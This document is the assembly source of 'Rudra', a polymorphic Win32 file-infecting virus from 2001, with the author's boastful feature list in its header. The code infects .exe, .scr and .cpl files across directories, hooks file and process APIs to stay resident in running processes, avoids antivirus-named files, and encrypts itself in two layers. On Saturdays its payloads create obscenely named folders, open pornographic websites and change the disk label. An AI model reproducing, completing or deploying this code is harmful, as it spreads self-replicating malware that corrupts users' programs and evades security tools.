
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                             ฤ< Win32.Rudra >ฤ
;                            Designed by LiteSys
;
; This is Rudra, my first polymorphic virus. It's a direct action (with
; directory backwards navigation) and a per-process resident virus. Hooks
; the following APIs: CreateProcessA, WinExec, CreateFileA, OpenFileA,
; CopyFileA, MoveFileA, _lopen.
;
; To say that the poly engine is stupid is an appropiate metaphor, the
; reasons are obvious: the decryption opcodes are fixed and in a fixed
; position in the decryptor, so it would be very easy to the avers to
; detect it using mask. I used two encryption layers (maybe it's a very bad
; implemented idea), being the first the polymorphic one.
; It's the first poly engine i've written so far, and I didn't have any
; other poly code so I think many concepts are still unclear in my mind.
; But next will be better, promised.
;
; The infection algorithm is, obviously, last section expanding, I really
; don't care about overwriting the .reloc section, albeit it's never used,
; I let it alone...
;
; This virus has multiple payloads. Executed every sabbath, consists in
; executing one of the three following payloads:
;
; + Creates some stupid named directories on the root directory with a
;   little offensive note in spanish.
; + Browses to some Venezuelan XXX sites (I included a lame C:\con\con to
;   hang up some idiots).
; + Sets the hard disk label with some offensive stuff.
;
; This virus uses SEH to generate an exception and to trap any possible
; exceptions.
;
; Don't ask me why that name, it came from nothing... hehe. Ok, ok, ok,
; you get a prize if you guess where did this name came from!
;
; By the way, this is another shitty virus written by me... don't expect
; too much stability or optimization 'cause I don't have time to spend
; with it...
;
; So, in resume, this virus has:
;
; + Per-Process Residence
; + Direct Action Infection with directory backwards navigation
; + Last section infection
; + Avoids infecting some "suspicious" AV-like files
; + SEH for antidebugging purposes
; + SEH for stability purposes
; + Two layers of encryption, first one is polymorphic
; + Simple, lame and weak polymorphism
; + Multiple Payloads
; + Does other stuff.
; + Virus Size: 5392 bytes.
;
; So, I don't have anything else to say about this shit, maybe greets, yeah
; greets are gewd and go to: Mindlock, Knight-7, Evul, Gigabyte, Tokugawa,
; Maquiavelo, Thorndike and everybody I forgot... hope you forgive me =P.
;
; LiteSys.
; "Patria o Muerte: Venceremos"    (Ernesto "Che" Guevara)
; Venezuela, Junio/Julio 2001
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


.386
.MODEL FLAT, STDCALL
LOCALS

INCLUDE C:\TOOLS\TASM\INCLUDE\WIN32API.INC
INCLUDE C:\TOOLS\TASM\INCLUDE\WINDOWS.INC

EXTRN ExitProcess:PROC
EXTRN MessageBoxA:PROC

.DATA

 Tamaคo_Virus           EQU     (Termina_Virus - Empieza_Virus)
 Tamaคo_Decrip          EQU     (Empieza_Virus - Rudra)
 Tamaคo_Total           EQU     (Tamaคo_Decrip + Tamaคo_Virus)
 Tamaคo_Layer2          EQU     (Termina_Virus - Empieza_Layer2)

 APICALL                MACRO   APIx
   CALL DWORD PTR [EBP][APIx]
 ENDM

 OFS                    EQU     <OFFSET [EBP]>
 BY                     EQU     <BYTE PTR [EBP]>
 WO                     EQU     <WORD PTR [EBP]>
 DWO                    EQU     <DWORD PTR [EBP]>

 PAGINAS                EQU     <32h>
 KERNEL_9X              EQU     <0BFF70000h>
 GPA_9X                 EQU     <0BFF76DACh>
 CRLF                   EQU     <0Dh, 0Ah>
 RDTSC                  EQU     <DW 310Fh>

 SYSTEMTIME             STRUC

 wYear                  DW      0000h
 wMonth                 DW      0000h
 wDayOfWeek             DW      0000h
 wDay                   DW      0000h
 wHour                  DW      0000h
 wMinute                DW      0000h
 wSecond                DW      0000h
 wMilliseconds          DW      0000h

 SYSTEMTIME             ENDS


 Titulo                 DB      "-=( Rudra )=-", 00h
 Ventana                DB      "Virus 'Rudra' por LiteSys", CRLF
                        DB      "Primera Generacion!", CRLF, CRLF
                        DB      "Tama๑o total del virus: "
                        DB      Tamaคo_Total / 1000 MOD 10 + 30h
                        DB      Tamaคo_Total / 0100 MOD 10 + 30h
                        DB      Tamaคo_Total / 0010 MOD 10 + 30h
                        DB      Tamaคo_Total / 0001 MOD 10 + 30h
                        DB      CRLF
                        DB      00h
.CODE

Rudra:

  DB 24d DUP (90h)          ; los bloques son llenados con la basura del poly
  CALL Delta
  Delta:
  DB 24d DUP (90h)
  POP EBP
  DB 24d DUP (90h)
  SUB EBP, OFFSET Delta
  DB 24d DUP (90h)
  LEA EDI, OFS [Empieza_Virus]
  DB 24d DUP (90h)
  MOV ECX, Tamaคo_Virus / 4
  DB 24d DUP (90h)
  @KZ: XOR DWORD PTR [EDI], 00000000h
  DB 27d DUP (90h)
  ADD EDI, 00000004h
  DB 24d DUP (90h)
  LOOP @KZ

  Empieza_Virus         LABEL   NEAR

  MOV ECX, Tamaคo_Layer2 / 2
  LEA EDI, OFS [Empieza_Layer2]
  @DCL2:
   SUB WORD PTR [EDI], "HO"
   ORG $-2
   Llave_II             DW      0000h
   ADD EDI, 02d
  LOOP @DCL2

  Empieza_Layer2        LABEL   NEAR

  JMP @@1
   DB   "  [RUDRA]  "
  @@1:

  MOV EDI, DWORD PTR [ESP]

  PUSHAD

  CALL @Seh_1

  MOV ESP, [ESP+8h]
  XOR EAX, EAX
  POP DWORD PTR FS:[EAX]
  POP EAX
  POPAD

  JMP @SigueCodigo

  @Seh_1:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP
  DEC BYTE PTR [EAX]

  @SigueCodigo:

  CALL @Seh_2

  MOV ESP, [ESP+8h]
  XOR EAX, EAX
  POP DWORD PTR FS:[EAX]
  POP EAX
  JMP @Finale

  @Seh_2:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  CALL @Mardito
  @Mardito:
  POP EAX
  SUB EAX, "HOHO"
  ORG $-4
  El_EIP                DD      00001000h
  SUB EAX, (@Mardito - Rudra)
  MOV DWO [IBase], EAX

  CALL Obtener_K32
  MOV EBX, EAX
  CALL Obtener_GPA

  MOV EBX, DWO [KERNEL32]
  LEA EDI, OFS [APIs_KERNEL32]
  LEA ESI, OFS [LoadLibraryA]
  CALL Obtener_APIs

  LEA EAX, OFS [Directorio_Inicial]
  PUSH EAX
  PUSH MAX_PATH
  APICALL GetCurrentDirectoryA
 
  @Busca_Primero:

  LEA EAX, OFS [Busqueda]
  PUSH EAX
  LEA EAX, OFS [Archivos]
  PUSH EAX
  APICALL FindFirstFileA
  MOV DWO [SHandle], EAX
  INC EAX
  JZ @Nada

  @La_Recluta:

  LEA EDI, OFS [Busqueda.wfd_szFileName]
  XOR EAX, EAX
  SCASB
  JNZ $-1

  MOV EAX, DWORD PTR [EDI-5h]
  OR EAX, 20202020h
  CMP EAX, "exe."                      ; *.exe
  JE @Enchufalo
  CMP EAX, "rcs."                      ; *.scr
  JE @Enchufalo
  CMP EAX, "lpc."                      ; *.cpl
  JE @Enchufalo

  @Busca_Proximo:

  LEA EAX, OFS [Busqueda]
  PUSH EAX
  PUSH DWO [SHandle]
  APICALL FindNextFileA
  OR EAX, EAX
  JNZ @La_Recluta

  PUSH DWO [SHandle]
  APICALL FindClose

  @Nada:

  LEA EAX, OFS [PaTras]
  PUSH EAX
  APICALL SetCurrentDirectoryA

  LEA EAX, OFS [Busqueda.wfd_szFileName]
  PUSH EAX
  PUSH MAX_PATH
  APICALL GetCurrentDirectoryA
  CMP EAX, DWO [Virgo]
  JE @Fin_DA
  MOV DWO [Virgo], EAX

  JMP @Busca_Primero

  @Fin_DA:

  LEA EAX, OFS [Directorio_Inicial]
  PUSH EAX
  APICALL SetCurrentDirectoryA

  CALL Hookear
  CALL Paylo

  @Finale:

  PUSH "HOHO"
  ORG $-4
  Retorno               DD      OFFSET Host_Falso
  RET

  ; 01h -> Create
  ; 02h -> File
  ; 03h -> Map
  ; 04h -> View
  ; 05h -> Find
  ; 06h -> Close
  ; 07h -> Set
  ; 08h -> Get
  ; 09h -> Load
  ; 0Ah -> CurrentDirectory
  ; 0Bh -> Virtual
          
  APIs_KERNEL32         DB      09h, "LibraryA", 00h        ; LoadLibraryA
                        DB      01h, 02h, "A", 00h          ; CreateFileA
                        DB      01h, 02h, 03h, "pingA", 00h ; CreateFileMappingA
                        DB      03h, 04h, "Of", 02h, 00h    ; MapViewOfFile
                        DB      "Unmap", 04h, "Of", 02h, 00h; UnmapViewOfFile
                        DB      06h, "Handle", 00h          ; CloseHandle
                        DB      05h, "First", 02h, "A", 00h ; FindFirstFileA
                        DB      05h, "Next", 02h, "A", 00h  ; FindNextFileA
                        DB      05h, 06h, 00h               ; FindClose
                        DB      07h, 02h, "AttributesA", 00h; SetFileAttributesA
                        DB      08h, 02h, "Size", 00h       ; GetFileSize
                        DB      07h, 02h, "Pointer", 00h    ; SetFilePointer
                        DB      07h, "EndOf", 02h, 00h      ; SetEndOfFile
                        DB      08h, 0Ah, "A", 00h          ; GetCurDirA
                        DB      07h, 0Ah, "A", 00h          ; SetCurDirA
                        DB      08h, "TickCount", 00h       ; GetTickCount
                        DB      08h, "SystemTime", 00h      ; GetSystemTime
                        DB      "_lopen", 00h               ; _lopen
                        DB      "Open", 02h, "A", 00h       ; OpenFileA
                        DB      "Move", 02h, "A", 00h       ; MoveFileA
                        DB      "Copy", 02h, "A", 00h       ; CopyFileA
                        DB      01h, "ProcessA", 00h        ; CreateProcessA
                        DB      "WinExec", 00h              ; WinExec
                        DB      0Bh, "Alloc", 00h           ; VirtualAlloc
                        DB      0Bh, "Free", 00h            ; VirtualFree
                        DB      01h, "DirectoryA", 00h      ; CreateDirA
                        DB      "_lcreat", 00h
                        DB      "_lwrite", 00h
                        DB      07h, "VolumeLabelA", 00h
                        DB      0FFh

  LoadLibraryA          DD      00000000h
  CreateFileA           DD      00000000h
  CreateFileMappingA    DD      00000000h
  MapViewOfFile         DD      00000000h
  UnmapViewOfFile       DD      00000000h
  CloseHandle           DD      00000000h
  FindFirstFileA        DD      00000000h
  FindNextFileA         DD      00000000h
  FindClose             DD      00000000h
  SetFileAttributesA    DD      00000000h
  GetFileSize           DD      00000000h
  SetFilePointer        DD      00000000h
  SetEndOfFile          DD      00000000h
  GetCurrentDirectoryA  DD      00000000h
  SetCurrentDirectoryA  DD      00000000h
  GetTickCount          DD      00000000h
  GetSystemTime         DD      00000000h
  _lopen                DD      00000000h
  OpenFileA             DD      00000000h
  MoveFileA             DD      00000000h
  CopyFileA             DD      00000000h
  CreateProcessA        DD      00000000h
  WinExec               DD      00000000h
  VirtualAlloc          DD      00000000h
  VirtualFree           DD      00000000h
  CreateDirectoryA      DD      00000000h
  _lcreat               DD      00000000h
  _lwrite               DD      00000000h
  SetVolumeLabelA       DD      00000000h

  IBase                 DD      00000000h

  Firma                 DB      "-=( RUDRA )=-", 0Dh, 0Ah
  
  @Enchufalo:
    LEA EBX, OFS [Busqueda.wfd_szFileName]
    CALL Infectar_PE
  JMP @Busca_Proximo

  Fecha                         SYSTEMTIME      <>
  Busqueda              DB      SIZEOF_WIN32_FIND_DATA DUP (00h)
  Archivos              DB      "*.???", 00h
  PaTras                DB      "..", 00h
  SHandle               DD      00000000h
  Virgo                 DD      00000000h
  KERNEL32              DD      00000000h
  Directorio_Inicial    DB      MAX_PATH DUP (00h)

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  ; Proceso para obtener la base de K32 y GetProcAddress.
  ;
  ; EDI -> Doble Palabra apuntada por ESP que representa el
  ; call...

  Obtener_K32           PROC

  AND EDI, 0FFFF0000h
  PUSH PAGINAS
  POP ECX

  @Revisa_K32:

  PUSH EDI
  CMP BYTE PTR [EDI], "M"
  JNE @Proximo_K32

  ADD EDI, [EDI+3Ch]
  CMP BYTE PTR [EDI], "P"
  JE @Encontrado_K32

  @Proximo_K32:

  POP EDI
  SUB EDI, 1000h

  LOOP @Revisa_K32

  @Encontrado_K32:

  POP EAX
  MOV DWO [KERNEL32], EAX

  RET

  Obtener_K32           ENDP

  DB 10h DUP (90h)

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  ; Proceso para obtener la base de GetProcAddress
  ;
  ; EBX -> Base de KERNEL32.

  Obtener_GPA           PROC

  MOV ESI, EBX

  ADD ESI, DWORD PTR [ESI+3Ch]
  MOV ESI, DWORD PTR [ESI+78h]
  ADD ESI, EBX                              ; Obtiene tabla de exportaciones.
  MOV DWO [EXPORTS], ESI

  MOV ECX, DWORD PTR [ESI+18h]
  DEC ECX

  MOV ESI, DWORD PTR [ESI+20h]
  ADD ESI, EBX

  XOR EAX, EAX

  @Busca:

  MOV EDI, DWORD PTR [ESI]
  ADD EDI, EBX
  PUSH ESI

  LEA ESI, OFS [GPA]

  PUSH ECX
  PUSH Largo_GPA
  POP ECX
  REP CMPSB
  JE @Encontrado_GPA

  POP ECX
  INC EAX
  POP ESI
  ADD ESI, 4h

  LOOP @Busca

  JMP @Hardcode

  @Encontrado_GPA:

    POP ESI
    POP ECX

    MOV EDI, DWO [EXPORTS]
    ADD EAX, EAX

    MOV ESI, DWORD PTR [EDI+24h]
    ADD ESI, EBX
    ADD ESI, EAX

    MOVZX EAX, WORD PTR [ESI]
    IMUL EAX, EAX, 4h

    MOV ESI, DWORD PTR [EDI+1Ch]
    ADD ESI, EBX
    ADD ESI, EAX

    MOV EAX, DWORD PTR [ESI]
    ADD EAX, EBX
    MOV DWO [GetProcAddress], EAX

    RET

  @Hardcode:

    PUSH GPA_9X
    POP EAX
    MOV DWO [GetProcAddress], EAX
    RET

  EXPORTS               DD      00000000h
  GPA                   DB      "GetProcAddress", 00h
  Largo_GPA             EQU     $-GPA
  GetProcAddress        DD      00000000h

  Obtener_GPA           ENDP

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  ; Proceso para obtener y desempaquetar las APIs
  ;
  ; EBX -> Modulo.
  ; EDI -> Cadenas de las APIs (empaquetadas).
  ; ESI -> DWORDs para guardar las rvas.

  Obtener_APIs          PROC

  ; 01h -> Create
  ; 02h -> File
  ; 03h -> Map
  ; 04h -> View
  ; 05h -> Find
  ; 06h -> Close
  ; 07h -> Set
  ; 08h -> Get
  ; 09h -> Load
  ; 0Ah -> CurrentDirectory
  ; 0Bh -> Virtual

  PUSHAD

  MOV DWO [PaGuardar], ESI
  XCHG ESI, EDI

  @OA1:

  LEA EDI, OFS [API_Trabajo]

  @OA2:

  CMP BYTE PTR [ESI], 00h
  JE @OA4

  LODSB
  CMP AL, 0Bh
  JA @OA3

  XOR ECX, ECX
  MOV CL, AL

  PUSH ESI

  LEA ESI, OFS [API_Packer]

  @OA5:
   INC ESI
   CMP BYTE PTR [ESI], 00h
  JNZ @OA5

  LOOP @OA5

  INC ESI
  @OA6:
   MOVSB
   CMP BYTE PTR [ESI], 00h
  JNZ @OA6

  POP ESI
  JMP @OA2

  @OA3:
   STOSB
  JMP @OA2

  @OA4:

  XOR AL, AL
  STOSB
     
  LEA EAX, OFS [API_Trabajo]
  PUSH EAX
  PUSH EBX
  APICALL GetProcAddress

  PUSH ESI
  MOV ESI, DWO [PaGuardar]
  MOV DWORD PTR [ESI], EAX
  ADD ESI, 4h
  MOV DWO [PaGuardar], ESI
  POP ESI
  INC ESI

  CMP BYTE PTR [ESI], 0FFh
  JNZ @OA1

  @OA7:
  POPAD
  RET

  API_Trabajo           DB      32 DUP (00h)
  PaGuardar             DD      00000000h
  API_Packer            DB      ":)", 00h
                        DB      "Create", 00h
                        DB      "File", 00h
                        DB      "Map", 00h
                        DB      "View", 00h
                        DB      "Find", 00h
                        DB      "Close", 00h
                        DB      "Set", 00h
                        DB      "Get", 00h
                        DB      "Load", 00h
                        DB      "CurrentDirectory", 00h
                        DB      "Virtual", 00h

  ; 01h -> Create
  ; 02h -> File
  ; 03h -> Map
  ; 04h -> View
  ; 05h -> Find
  ; 06h -> Close
  ; 07h -> Set
  ; 08h -> Get
  ; 09h -> Load
  ; 0Ah -> CurrentDirectory
  ; 0Bh -> Virtual


  Obtener_APIs          ENDP

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  ; Proceso para infectar un archivo PE.
  ; EBX -> Nombre del archivo.

  Infectar_PE           PROC

  PUSHAD

  PUSH DWO [Retorno]
  POP DWO [EP_Viejo]

  MOV EAX, DWORD PTR [EBX]
  OR EAX, 20202020h
  LEA ESI, OFS [Bad_Dwords]

  @Rev_BadDW:

  CMP EAX, DWORD PTR [ESI]
  JE @Fin_IPE
  ADD ESI, 4h
  CMP BYTE PTR [ESI], 0FFh
  JNE @Rev_BadDW

  @Rev_BadW:

  INC ESI

  CMP AX, WORD PTR [ESI]
  JE @Fin_IPE
  ADD ESI, 2h
  CMP BYTE PTR [ESI], 0FFh
  JNE @Rev_BadW

  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH EBX
  APICALL SetFileAttributesA

  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH OPEN_EXISTING
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  PUSH EBX
  APICALL CreateFileA
  MOV DWO [FHandle], EAX
  INC EAX
  JZ @Fin_IPE
  DEC EAX

  XOR EBX, EBX
  PUSH EBX
  PUSH EAX
  APICALL GetFileSize
  MOV DWO [Tamaคo], EAX
  INC EAX
  JZ @Fin_IPE
  DEC EAX

  ADD EAX, Tamaคo_Total+1000h
  MOV DWO [Tamaคo2], EAX

  XOR EBX, EBX
  PUSH EBX
  PUSH EAX
  PUSH EBX
  PUSH PAGE_READWRITE
  PUSH EBX
  PUSH DWO [FHandle]
  APICALL CreateFileMappingA
  MOV DWO [MHandle], EAX
  OR EAX, EAX
  JZ @Cierra_FHandle

  XOR EBX, EBX

  PUSH DWO [Tamaคo2]
  PUSH EBX
  PUSH EBX
  PUSH FILE_MAP_WRITE
  PUSH EAX
  APICALL MapViewOfFile
  MOV DWO [BaseMap], EAX
  OR EAX, EAX
  JZ @Cierra_MHandle

  MOV EDI, EAX

  MOV BX, WORD PTR [EDI]
  AND BX, 9473h
  XOR BX, 1041h                              ; 'ZM' & 9473h == 1014h
  JNZ @Cierra_BaseMap

  ADD EDI, [EDI+3Ch]

  MOV BX, WORD PTR [EDI]
  OR BX, 1218h                               ; 'EP' | 1218h == 5758h
  XOR BX, 5758h
  JNZ @Cierra_BaseMap

  CMP DWORD PTR [EDI+4Ch], " XSL"
  JE @Cierra_BaseMap

  MOV DWORD PTR [EDI+4Ch], " XSL"

  MOV ESI, EDI
  ADD ESI, 18h
  MOVZX EAX, WORD PTR [EDI+14h]
  ADD ESI, EAX

  XOR EDX, EDX
  MOVZX EDX, WORD PTR [EDI+06h]
  DEC EDX
  IMUL EDX, EDX, 28h
  ADD ESI, EDX                               ; secciones.

  MOV EBX, 0A0000020h
  OR DWORD PTR [ESI+24h], EBX                ; atributos.

  MOV EAX, DWORD PTR [ESI+8h]

  PUSH EAX
  ADD EAX, Tamaคo_Total
  MOV DWORD PTR [ESI+8h], EAX

  MOV EBX, DWORD PTR [EDI+3Ch]
  XOR EDX, EDX
  DIV EBX
  INC EAX
  MUL EBX

  MOV DWORD PTR [ESI+10h], EAX
  POP EDX

  MOV EAX, DWORD PTR [EDI+28h]
  MOV EBX, DWORD PTR [EDI+34h]
  ADD EAX, EBX
  MOV DWO [Retorno], EAX

  ADD EDX, DWORD PTR [ESI+0Ch]
  MOV DWORD PTR [EDI+28h], EDX
  MOV DWO [El_EIP], EDX

  MOV EAX, DWORD PTR [ESI+10h]
  ADD EAX, DWORD PTR [ESI+0Ch]
  MOV DWORD PTR [EDI+50h], EAX

  MOV EDI, DWORD PTR [ESI+14h]
  ADD EDI, DWORD PTR [ESI+8h]
  MOV ECX, Tamaคo_Virus
  SUB EDI, Tamaคo_Total
  ADD EDI, DWO [BaseMap]

  CALL RUMEN

  PUSH DWO [Tamaคo2]
  POP DWO [Tamaคo]

  MOV EAX, EDI
  SUB EAX, DWO [BaseMap]
  MOV ECX, DWO [Tamaคo]
  SUB ECX, EAX
  OR ECX, ECX
  JB @Cierra_BaseMap
  XOR EAX, EAX
  REP STOSB                                     ; meramente estetico.

  @Cierra_BaseMap:

  PUSH DWO [BaseMap]
  APICALL UnmapViewOfFile

  @Cierra_MHandle:

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH DWO [Tamaคo]
  PUSH DWO [FHandle]
  APICALL SetFilePointer

  PUSH DWO [FHandle]
  APICALL SetEndOfFile

  PUSH DWO [MHandle]
  APICALL CloseHandle

  @Cierra_FHandle:

  PUSH DWO [FHandle]
  APICALL CloseHandle

  @Fin_IPE:

  PUSH DWO [EP_Viejo]
  POP DWO [Retorno]

  POPAD
  RET

  FHandle               DD      00000000h
  MHandle               DD      00000000h
  BaseMap               DD      00000000h
  Tamaคo                DD      00000000h
  Tamaคo2               DD      00000000h
  SizeOfRawData         DD      00000000h
  EP_Viejo              DD      00000000h

  Bad_DWords            DB      "defr"               ; defrag
                        DB      "scan"               ; scandisk
                        DB      "anti"               
                        DB      "rund"               
                        DB       0FFh

  Bad_Words             DB      "av"                 
                        DB      "sc"
                        DB      "tb"
                        DB      "f-"
                        DB      "no"
                        DB      "00"
                        DB      "aa"
                        DB      0FFh

  Infectar_PE           ENDP

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

                        DB      "[" XOR 33h
                        DB      "D" XOR 33h
                        DB      "e" XOR 33h
                        DB      "s" XOR 33h
                        DB      "i" XOR 33h
                        DB      "g" XOR 33h
                        DB      "n" XOR 33h
                        DB      "e" XOR 33h
                        DB      "d" XOR 33h
                        DB      " " XOR 33h
                        DB      "b" XOR 33h
                        DB      "y" XOR 33h
                        DB      " " XOR 33h
                        DB      "L" XOR 33h
                        DB      "i" XOR 33h
                        DB      "t" XOR 33h
                        DB      "e" XOR 33h
                        DB      "S" XOR 33h
                        DB      "y" XOR 33h
                        DB      "s" XOR 33h
                        DB      "]" XOR 33h
                        DB              33h
                        DB      0Dh XOR 33h
                        DB      0Ah XOR 33h
                        DB      "(" XOR 33h
                        DB      "c" XOR 33h
                        DB      ")" XOR 33h
                        DB      " " XOR 33h
                        DB      "J" XOR 33h
                        DB      "u" XOR 33h
                        DB      "n" XOR 33h
                        DB      "i" XOR 33h
                        DB      "o" XOR 33h
                        DB      "/" XOR 33h
                        DB      "J" XOR 33h
                        DB      "u" XOR 33h
                        DB      "l" XOR 33h
                        DB      "i" XOR 33h
                        DB      "o" XOR 33h
                        DB      " " XOR 33h
                        DB      "2" XOR 33h
                        DB      "0" XOR 33h
                        DB      "0" XOR 33h
                        DB      "1" XOR 33h
                        DB      " " XOR 33h
                        DB      "-" XOR 33h
                        DB      " " XOR 33h
                        DB      "H" XOR 33h
                        DB      "e" XOR 33h
                        DB      "c" XOR 33h
                        DB      "h" XOR 33h
                        DB      "o" XOR 33h
                        DB      " " XOR 33h
                        DB      "e" XOR 33h
                        DB      "n" XOR 33h
                        DB      " " XOR 33h
                        DB      "V" XOR 33h
                        DB      "e" XOR 33h
                        DB      "n" XOR 33h
                        DB      "e" XOR 33h
                        DB      "z" XOR 33h
                        DB      "u" XOR 33h
                        DB      "e" XOR 33h
                        DB      "l" XOR 33h
                        DB      "a" XOR 33h
                        DB      "!" XOR 33h
                        DB              33h

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  ; Proceso para hookear las APIs, residencia por procesos pues...

  Hookear               PROC

  PUSHAD

  LEA EDI, OFS [A_CreateFileA]
  PUSH "nrek"
  POP DWO [PString]

  @Hook_Una:

  PUSH EDI
  CALL @Obtener_Import
  POP EDI
  OR EAX, EAX
  JZ @ProxAPI2

  XOR AL, AL
  SCASB
  JNZ $-1

  MOV EAX, DWORD PTR [EDI]
  ADD EAX, EBP
  MOV DWORD PTR [EBX], EAX

  @ProxAPI:

  ADD EDI, 4h
  CMP BYTE PTR [EDI], 0FFh
  JNZ @Hook_Una

  @Fin_Hookear:

  POPAD
  RET

  @ProxAPI2:

  XOR AL, AL
  SCASB
  JNZ $-1

  JMP @ProxAPI


  A_CreateFileA         DB      "CreateFileA", 00h
  I_CreateFileA         DD      (@Hook_CreateFileA)

  A_OpenFileA           DB      "OpenFileA", 00h
  I_OpenFileA           DD      (@Hook_OpenFileA)

  A_MoveFileA           DB      "MoveFileA", 00h
  I_MoveFileA           DD      (@Hook_MoveFileA)

  A_CopyFileA           DB      "CopyFileA", 00h
  I_CopyFileA           DD      (@Hook_CopyFileA)

  A__lopen              DB      "_lopen", 00h
  I__lopen              DD      (@Hook__lopen)

  A_CreateProcessA      DB      "CreateProcessA", 00h
  I_CreateProcessA      DD      (@Hook_CreateProcessA)

  A_WinExec             DB      "WinExec", 00h
  I_WinExec             DD      (@Hook_WinExec)
                        DB      0FFh

  PString               DD      00000000h
  Cuento                DB      00h
  TString               DB      00h

  @Hook_Comun:
    PUSHAD
    PUSHFD

    MOV EDI, DWORD PTR [ESP+2Ch]
    MOV EBX, EDI
    XOR AL, AL
    SCASB
    JNZ $-1
    MOV EDX, DWORD PTR [EDI-5h]
    OR EDX, 20202020h
    CMP EDX, "exe."
    JZ @InfectaHook
    CMP EDX, "rcs."
    JZ @InfectaHook
    CMP EDX, "lpc."
    JZ @InfectaHook

    @Regresa_Hook:

    POPFD
    POPAD

    RET

    @InfectaHook:
      CALL Infectar_PE
      JMP @Regresa_Hook

  @Hook_CreateFileA:
    CALL @Hook_Comun
    JMP DWO [CreateFileA]

  @Hook_OpenFileA:
    CALL @Hook_Comun
    JMP DWO [OpenFileA]

  @Hook_MoveFileA:
    CALL @Hook_Comun
    JMP DWO [MoveFileA] 

  @Hook_CopyFileA:
    CALL @Hook_Comun
    JMP DWO [CopyFileA]

  @Hook__lopen:
    CALL @Hook_Comun
    JMP DWO [_lopen]

  @Hook_CreateProcessA:
    CALL @Hook_Comun
    JMP DWO [CreateProcessA]

  @Hook_WinExec:
    CALL @Hook_Comun
    JMP DWO [WinExec]

  ; Those routines belong to Billy Belcebu's VWG32...
  
  @Obtener_Import:

  PUSH EDI

  XOR ECX, ECX
  XOR AL, AL
  INC ECX
  SCASB
  JNE $-2
  MOV BY [TString], CL

  MOV EDI, DWO [IBase]
  MOV EBX, EDI
  ADD EDI, [EDI+3Ch]
  MOV AX, WORD PTR [EDI]
  XOR AX, 6699h                              
  CMP AX, 23C9h                              ; "EP" ^| 6699h == 23C9h
  JNE @Fin_OI

  MOV ESI, DWORD PTR [EDI+7Ch]
  ADD ESI, DWORD PTR [EDI+80h]
  ADD ESI, EBX

  @Rebusca_PString:

  PUSH ESI
  MOV ESI, [ESI+0Ch]
  ADD ESI, EBX
  MOV EDX, DWORD PTR [ESI]
  OR EDX, 20202020h
  CMP EDX, DWO [PString]
  POP ESI
  JE @Enco_K32

  ADD ESI, 14h

  JMP @Rebusca_PString

  @Enco_K32:

  CMP BYTE PTR [ESI], 00h
  JE @Fin_OI

  MOV EDX, [ESI+10h]
  ADD EDX, EBX
  AND BY [CUENTO], 00h

  LODSD
  OR EAX, EAX
  JZ @Fin_OI

  XCHG EDX, EAX
  ADD EDX, EBX

  @Ciclo_API:

  CMP DWORD PTR [EDX], 00000000h
  JE @Fin_OI

  CMP BYTE PTR [EDX+3h], 80h
  JE @Lesigue

  POP EDI
  PUSH EDI
  MOVZX ECX, BY [TString]

  MOV ESI, DWORD PTR [EDX]
  ADD ESI, EBX
  ADD ESI, 2h
  PUSH ECX
  REP CMPSB
  POP ECX
  JE @Okaza
  
  @Lesigue:

  INC BY [Cuento]
  ADD EDX, 4h
  JMP @Ciclo_API

  @Okaza:

  ADD ESP, 4d

  MOVZX EBX, BY [Cuento]
  IMUL EBX, 4h
  ADD EBX, EAX
  MOV EAX, DWORD PTR [EBX]

  RET
  
  @Fin_OI:

  ADD ESP, 4d

  XOR EAX, EAX
  RET

  Hookear               ENDP
  
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  Paylo                 PROC
  PUSHAD

  APICALL GetTickCount
  NEG EAX
  MOV DWO [Puyado], EAX

  LEA EAX, OFS [Fecha]
  PUSH EAX
  APICALL GetSystemTime
  CMP WO [Fecha.wDayOfWeek], 6d
  JNZ @Retorna_Paylo

  PUSH 00000003h
  POP EBX
  CALL @Puyalo
  OR EAX, EAX
  JZ @CrearDirectorios
  CMP EAX, 1d
  JZ @PonerSitios
  CMP EAX, 2d
  JZ @CambiarVolumen

  @Retorna_Paylo:

  POPAD
  RET

  Directorios           DB      "\El Guevo", 00h
                        DB      "\Fotos Porno", 00h
                        DB      "\Sodomia y Otras Perversiones", 00h
                        DB      "\Prostitucion de Niคas", 00h
                        DB      "\Ventas de Cocaina", 00h
                        DB      "\Planes de Golpe de Estado", 00h
                        DB      "\Facturas de Autos Robados", 00h
                        DB      "\Se vende este computador", 00h
                        DB      "\Rudra", 00h

  Idioteces             DB      "Te meto hasta el fondo!", 00h
                        DB      "Toma guevo por curioso", 00h
                        DB      "Vamos a jugar keto: vos te agachas, yo te lo meto.", 0Dh, 0Ah
                        DB      "O que tal piragua?", 0Dh, 0Ah
                        DB      "Y Rinoceronte?", 00h
                        DB      "Alarma activada! Alarma activada! Llamando a "
                        DB      "la DISIP por modem! acusando por violacion de "
                        DB      "los derechos humanos!", 00h
                        DB      "La DHEA ha sido contactada... usted esta rodeado.", 00h
                        DB      "Andate pa' la puta mierda adeco corrupto sucio culiao.", 00h
                        DB      "Mardito sea el que se llevo mi Fairlander!!!", 00h
                        DB      "Gracias por activar esta opcion. En este "
                        DB      "momento estamos colocando un clasificado en "
                        DB      "El Universal para la venta de su computador.", 00h
                        DB      "Que? yo? un virus? estas loco? COMO TE ATREVES!", 00h

  Sitios_Web            DB      "http://www.sexycaracas.com", 00h
                        DB      "http://www.pornocaracas.com", 00h
                        DB      "http://www.venezuelaerotica.com", 00h
                        DB      "http://www.sexoloco.com", 00h
